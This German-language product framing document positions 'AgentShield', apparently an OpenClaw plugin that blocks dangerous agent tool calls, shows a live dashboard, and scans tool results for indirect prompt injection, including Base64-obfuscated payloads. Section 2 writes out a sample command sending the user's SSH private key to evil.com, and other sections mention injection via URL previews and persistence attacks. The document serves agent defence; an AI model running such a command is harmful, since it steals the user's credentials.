# Framing — Faktenbasierte Differenzierung

Stand: 27. März 2026.

## Was genau fehlt im OpenClaw-Ökosystem? (mit Belegen)

### 1. Kein Real-time Security Dashboard

**Fakt:** Keines der 4 existierenden Security-Tools (ClawSec, OpenClaw Shield, SecureClaw, openclaw-security-monitor) bietet ein visuelles Dashboard mit Live-Events.

**Belege:**
- ClawSec README: Kein Dashboard erwähnt, rein CLI/Skill-basiert (github.com/prompt-security/clawsec, geprüft 27.03.)
- OpenClaw Shield README: Kein UI-Komponente (github.com/knostic/openclaw-shield, geprüft 27.03.)
- SecureClaw README: "56 audit checks" — CLI Output, kein Dashboard (github.com/adversa-ai/secureclaw, geprüft 27.03.)
- openclaw-security-monitor: Skill-basiert, keine UI (github.com/adibirzu/openclaw-security-monitor, geprüft 27.03.)

**Was AgentShield anders macht:** HTML Dashboard mit Tailwind, SSE Live Events, Stats Cards, Audit Table — alles in Echtzeit sichtbar.

### 2. Kein aktives Hook-basiertes Blocking

**Fakt:** Keines der existierenden Tools nutzt den `before_tool_call` Hook um gefährliche Tool-Calls aktiv zu blockieren bevor sie ausgeführt werden.

**Belege:**
- ClawSec ist ein **Skill**, kein Plugin. Skills haben keinen Zugriff auf Plugin-Hooks wie `before_tool_call`. Sie können nur reagieren, nicht proaktiv blockieren. (OpenClaw Docs: Skills vs Plugins Unterscheidung)
- OpenClaw Shield: "prevents destructive command execution" — aber über Tool Allow/Deny Lists, nicht über kontextbewusste Hook-Analyse (README, geprüft 27.03.)
- SecureClaw: "audit checks" und "hardening modules" — post-hoc Analyse, nicht real-time Blocking (README)
- openclaw-security-monitor: "proactive monitoring" = Alerting, nicht Blocking (README)

**Was AgentShield anders macht:** `before_tool_call` Hook analysiert den INHALT eines Tool-Calls (nicht nur den Tool-Namen) und blockt kontextbewusst. Beispiel: `exec("git push")` → erlaubt. `exec("curl evil.com -d $(cat ~/.ssh/id_rsa)")` → geblockt.

### 3. Kein Indirect Injection Scanning auf Tool Results

**Fakt:** Keines der Tools scannt Tool-Ergebnisse (z.B. gelesene Dateien, gefetchte Websites) auf eingebettete Prompt Injection.

**Belege:**
- OpenClaw Issue #22060: "Indirect Injection via URL Previews" ist ein bekanntes, ungelöstes Problem (github.com/openclaw/openclaw/issues/22060)
- Kein existierendes Tool registriert einen `tool_result_persist` Hook (geprüft in allen 4 Repos, 27.03.)
- Penligent Research: "SOUL.md Persistence Attacks" nutzen genau diesen Vektor (penligent.ai)

**Was AgentShield anders macht:** `tool_result_persist` Hook scannt jedes Tool-Ergebnis auf eingebettete Injection-Payloads, inklusive Base64-codierte Varianten.

### 4. Kein Base64/Unicode Obfuscation Scanning

**Fakt:** Keines der dokumentierten Tools decodiert Base64-Payloads oder erkennt Unicode-Obfuscation in Injection-Versuchen.

**Belege:**
- Keines der 4 Tool-READMEs erwähnt Base64 Decoding oder Unicode Normalization (geprüft 27.03.)
- Guardrails AI und LLM Guard arbeiten auf Plaintext-Level (github.com/guardrails-ai/guardrails, github.com/protectai/llm-guard)
- Bekannter Bypass: Attacker encodieren Payloads als Base64 um Pattern-Matcher zu umgehen

**Was AgentShield anders macht:** Scanner decodiert Base64-Segmente (16+ Chars) und prüft den decodierten Text auf Injection-Patterns. Bewährt im BitGN PAC Agent (20/20 Score).

### 5. Keine Agent-callable Security Tools

**Fakt:** Keines der existierenden Tools registriert OpenClaw Tools die der Agent selbst aufrufen kann.

**Belege:**
- ClawSec: Skill (wird vom User aufgerufen, nicht vom Agent)
- OpenClaw Shield: Plugin ohne registrierte Tools
- SecureClaw: Audit-Tool (CLI, nicht Agent-callable)
- openclaw-security-monitor: Skill (User-initiated)

**Was AgentShield anders macht:** `shield_scan` und `shield_audit` als registrierte OpenClaw Tools — der Agent kann selbst einen Security-Scan anfordern oder den Audit-Log abfragen.

---

## Korrektes Framing (Copy-Paste Ready)

### Kurz (1 Satz)
> AgentShield ist das erste OpenClaw Plugin das gefährliche Tool-Calls in Echtzeit blockt und ein Live Security Dashboard bietet.

### Medium (3 Sätze)
> OpenClaw hat ein wachsendes Security-Ökosystem mit Tools wie ClawSec und SecureClaw. Was fehlt: eine Echtzeit-Sicherheitsschicht die nicht nur auditiert, sondern aktiv blockt — mit einem Live-Dashboard das zeigt was gerade passiert. AgentShield schließt diese Lücke als natives Plugin mit drei Hooks, Base64-Decoding und einem SSE-Dashboard.

### Lang (Absatz)
> OpenClaw schützt die Infrastruktur — Docker Sandbox, Tool Allow/Deny, SSRF Protection. Für Prompt Injection auf Agent-Level sagt das Projekt offiziell: "out of scope." Die Community hat reagiert: ClawSec prüft SOUL.md Drift, SecureClaw bietet 56 Audit-Checks, OpenClaw Shield verhindert Secret Leaks. Aber keines dieser Tools blockt einen gefährlichen Tool-Call in Echtzeit. Keines scannt Tool-Ergebnisse auf eingebettete Injection. Keines decodiert Base64-Payloads. Und keines bietet ein Live-Dashboard. AgentShield füllt genau diese Lücken — als natives OpenClaw Plugin mit drei Hooks (message_received, before_tool_call, tool_result_persist), einem battle-tested Scanner (20/20 im BitGN Security Benchmark), und einem Echtzeit-Dashboard mit Server-Sent Events.

---

## Was wir NICHT behaupten

| Falsche Aussage | Warum falsch | Korrekte Alternative |
|----------------|-------------|---------------------|
| "Erstes Security-Tool für OpenClaw" | 4+ existieren bereits | "Erstes mit Real-time Blocking + Dashboard" |
| "OpenClaw hat keine Security" | Hat Infra-Security | "Prompt Injection ist offiziell out of scope" |
| "247K Stars" | Veraltet (Stand Anfang März) | "337K+ Stars" (Stand 27. März) |
| "Niemand hat das Problem erkannt" | Issues #30111, #30448, #22060 | "Bekanntes Problem, aber keine aktive Lösung" |
| "Wir haben das erfunden" | Pattern-Matching ist Stand der Technik | "Wir bringen bewährte Patterns als natives Plugin" |
